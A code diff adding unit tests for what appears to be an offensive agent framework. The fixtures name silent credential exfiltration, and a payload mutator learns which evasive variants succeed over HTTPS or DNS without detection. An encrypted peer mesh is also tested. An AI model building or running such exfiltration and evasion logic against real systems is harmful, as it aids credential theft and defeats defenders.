@@ -346,3 +346,310 @@ def test_report_structure():
                 "total_signals", "signal_breakdown", "baseline"):
         assert key in report
     assert report["status"] in ("NOMINAL", "WARN", "HALT")
+
+
+# ── Entropy Capsule Engine ────────────────────────────────────────────────────
+
+def test_entropy_capsule_imports():
+    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
+    assert EntropyCapsuleEngine is not None
+
+
+def test_entropy_nominal_action_low_score():
+    from entropy_capsule import EntropyCapsuleEngine
+    engine = EntropyCapsuleEngine()
+    action = {
+        "action": "exfil", "targets": ["credentials"],
+        "schedule": None, "priority": "normal",
+        "noise": "silent",
+        "rationale": "Operator wants credential exfil deferred to low-activity window.",
+        "_error": None,
+    }
+    engine.ingest(action, original_command="exfil credentials after midnight")
+    assert engine.current_entropy() < 0.40
+
+
+def test_entropy_missing_rationale_raises_score():
+    from entropy_capsule import EntropyCapsuleEngine
+    engine = EntropyCapsuleEngine()
+    action = {
+        "action": "exfil", "targets": ["credentials"],
+        "schedule": None, "priority": "normal",
+        "noise": "normal", "rationale": "", "_error": None,
+    }
+    engine.ingest(action)
+    assert engine.current_entropy() > 0.20
+
+
+def test_entropy_null_fields_detected():
+    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
+    engine = EntropyCapsuleEngine()
+    action = {
+        "action": None, "targets": [],
+        "schedule": None, "priority": None,
+        "noise": None, "rationale": "",
+        "_error": "JSON parse failed",
+    }
+    signals = engine.ingest(action)
+    types = [s["type"] for s in signals]
+    assert any(t in types for t in [InstabilityType.CONFIDENCE_COLLAPSE.value, InstabilityType.TOKEN_ENTROPY.value, InstabilityType.COHERENCE_DRIFT.value])
+    assert InstabilityType.CONFIDENCE_COLLAPSE.value in types
+
+
+def test_entropy_hallucination_detected():
+    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
+    engine = EntropyCapsuleEngine()
+    action = {
+        "action": "exfil",
+        "targets": ["satellite_data", "nuclear_codes", "alien_frequencies"],
+        "schedule": None, "priority": "normal",
+        "noise": "normal",
+        "rationale": "Operator wants exfil.",
+        "_error": None,
+    }
+    signals = engine.ingest(
+        action,
+        original_command="exfil credentials"
+    )
+    types = [s["type"] for s in signals]
+    assert InstabilityType.HALLUCINATION.value in types
+
+
+def test_entropy_instability_spike_detected():
+    from entropy_capsule import EntropyCapsuleEngine, InstabilityType
+    engine = EntropyCapsuleEngine()
+    # First action — low entropy
+    engine.ingest({
+        "action": "exfil", "targets": ["credentials"],
+        "schedule": None, "priority": "normal",
+        "noise": "silent",
+        "rationale": "Operator wants credential exfiltration quietly.",
+        "_error": None,
+    })
+    # Second action — high entropy (sudden collapse)
+    signals = engine.ingest({
+        "action": None, "targets": ["*", "everything"],
+        "schedule": None, "priority": None,
+        "noise": None, "rationale": "",
+        "_error": "parse failed",
+    })
+    types = [s["type"] for s in signals]
+    assert InstabilityType.INSTABILITY_SPIKE.value in types
+
+
+def test_entropy_report_structure():
+    from entropy_capsule import EntropyCapsuleEngine
+    engine = EntropyCapsuleEngine()
+    engine.ingest({
+        "action": "recon", "targets": [],
+        "schedule": None, "priority": "normal",
+        "noise": "normal", "rationale": "Scanning network.", "_error": None,
+    })
+    report = engine.report()
+    for key in ("session_actions", "entropy_score", "status",
+                "total_signals", "signal_breakdown", "capsule_history"):
+        assert key in report
+    assert report["status"] in ("NOMINAL", "ELEVATED", "CRITICAL")
+
+
+def test_entropy_reset():
+    from entropy_capsule import EntropyCapsuleEngine
+    engine = EntropyCapsuleEngine()
+    engine.ingest({
+        "action": "exfil", "targets": ["credentials"],
+        "schedule": None, "priority": "normal",
+        "noise": "normal", "rationale": "test", "_error": None,
+    })
+    engine.reset()
+    assert engine.current_entropy() == 0.0
+    assert engine.action_count == 0
+
+
+# ── Payload Mutator ───────────────────────────────────────────────────────────
+
+def test_payload_mutator_imports():
+    from payload_mutator import PayloadMutator, Personality, MutationOp
+    assert PayloadMutator is not None
+
+
+def test_mutator_produces_result():
+    from payload_mutator import PayloadMutator
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "silent", "targets": ["credentials"]}
+    )
+    assert result.personality is not None
+    assert result.payload_hash is not None
+    assert len(result.payload_hash) == 16
+    assert result.fitness_score > 0
+
+
+def test_mutator_respects_noise_silent():
+    from payload_mutator import PayloadMutator, Personality, MutationOp
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "silent", "targets": ["credentials"]}
+    )
+    # Silent mode should not use aggressive ops
+    assert MutationOp.FRAGMENT not in result.mutation_ops
+
+
+def test_mutator_action_affinity():
+    from payload_mutator import PayloadMutator, Personality
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
+    )
+    # exfil affinity: leech, ghost, surgeon
+    assert result.personality in (
+        Personality.LEECH, Personality.GHOST, Personality.SURGEON
+    )
+
+
+def test_mutator_fitness_updates_on_feedback():
+    from payload_mutator import PayloadMutator, ChannelFeedback
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
+    )
+    initial_fitness = mutator.memory.fitness[result.personality]
+
+    # Successful feedback — fitness should increase
+    mutator.feedback(ChannelFeedback(
+        payload_hash=result.payload_hash,
+        success=True, detected=False,
+        channel="HTTPS", latency_ms=100,
+    ))
+    assert mutator.memory.fitness[result.personality] > initial_fitness
+
+
+def test_mutator_fitness_drops_on_detection():
+    from payload_mutator import PayloadMutator, ChannelFeedback
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "normal", "targets": ["credentials"]}
+    )
+    initial_fitness = mutator.memory.fitness[result.personality]
+
+    mutator.feedback(ChannelFeedback(
+        payload_hash=result.payload_hash,
+        success=False, detected=True,
+        channel="DNS", latency_ms=200,
+    ))
+    assert mutator.memory.fitness[result.personality] < initial_fitness
+
+
+def test_mutator_high_entropy_triggers_rotate():
+    from payload_mutator import PayloadMutator, MutationOp
+    mutator = PayloadMutator()
+    result = mutator.mutate(
+        {"action": "exfil", "noise": "silent", "targets": ["credentials"]},
+        entropy_score=0.80,
+        drift_score=0.70,
+    )
+    assert MutationOp.ROTATE in result.mutation_ops
+
+
+def test_mutator_fitness_report():
+    from payload_mutator import PayloadMutator, Personality
+    mutator = PayloadMutator()
+    report = mutator.fitness_report()
+    assert len(report) == len(Personality)
+    for v in report.values():
+        assert 0.0 <= v <= 1.0
+
+
+# ── mTLS Mesh ─────────────────────────────────────────────────────────────────
+
+def test_mtls_mesh_imports():
+    from mtls_mesh import MTLSMesh, PeerStatus, MeshMsgType
+    assert MTLSMesh is not None
+
+
+def test_mesh_keypair_generation():
+    from mtls_mesh import MTLSMesh
+    node = MTLSMesh()
+    assert node.fingerprint is not None
+    assert len(node.fingerprint) == 16
+    assert node.public_key_b64 is not None
+
+
+def test_handshake_token_valid():
+    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
+    node = MTLSMesh()
+    token = _sign_handshake(node.private_key, "192.168.1.1")
+    assert _verify_handshake(node.public_key_b64, token, "192.168.1.1")
+
+
+def test_handshake_token_tampered_rejected():
+    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
+    node = MTLSMesh()
+    token = _sign_handshake(node.private_key, "192.168.1.1")
+    tampered = token[:-4] + "xxxx"
+    assert not _verify_handshake(node.public_key_b64, tampered, "192.168.1.1")
+
+
+def test_handshake_wrong_ip_rejected():
+    from mtls_mesh import MTLSMesh, _sign_handshake, _verify_handshake
+    node = MTLSMesh()
+    token = _sign_handshake(node.private_key, "192.168.1.1")
+    assert not _verify_handshake(node.public_key_b64, token, "10.0.0.99")
+
+
+def test_encrypted_roundtrip():
+    from mtls_mesh import MTLSMesh, _make_box, _encrypt, _decrypt
+    node_a = MTLSMesh()
+    node_b = MTLSMesh()
+    box_ab = _make_box(node_a.private_key, node_b.public_key)
+    box_ba = _make_box(node_b.private_key, node_a.public_key)
+    msg = {"op": "test", "data": {"value": 42}}
+    assert _decrypt(box_ba, _encrypt(box_ab, msg)) == msg
+
+
+def test_tampered_ciphertext_rejected():
+    from mtls_mesh import MTLSMesh, _make_box, _encrypt, _decrypt
+    import pytest
+    node_a = MTLSMesh()
+    node_b = MTLSMesh()
+    box_ab = _make_box(node_a.private_key, node_b.public_key)
+    box_ba = _make_box(node_b.private_key, node_a.public_key)
+    enc = bytearray(_encrypt(box_ab, {"test": "data"}))
+    enc[32] ^= 0xFF
+    with pytest.raises(Exception):
+        _decrypt(box_ba, bytes(enc))
+
+
+def test_quarantine_sets_status():
+    from mtls_mesh import MTLSMesh, PeerStatus
+    node = MTLSMesh()
+    node.add_peer("10.0.0.1")
+    node._quarantine("10.0.0.1", "test")
+    assert node.peers["10.0.0.1"].status == PeerStatus.QUARANTINED
+    assert node.stats["peers_quarantined"] == 1
+
+
+def test_unverified_peer_cannot_receive_data():
+    from mtls_mesh import MTLSMesh
+    node = MTLSMesh()
+    node.add_peer("10.0.0.1")
+    # send_to should return False — peer not verified
+    result = node.send_to("10.0.0.1", {"op": "test"})
+    assert result is False
+
+
+def test_mesh_status_structure():
+    from mtls_mesh import MTLSMesh
+    node = MTLSMesh()
+    node.add_peer("10.0.0.1")
+    status = node.status()
+    assert "node_fingerprint" in status
+    assert "peers" in status
+    assert "stats" in status
+    assert "10.0.0.1" in status["peers"]
+
+
+def test_two_nodes_different_fingerprints():
+    from mtls_mesh import MTLSMesh
+    node_a = MTLSMesh()
+    node_b = MTLSMesh()
+    assert node_a.fingerprint != node_b.fingerprint
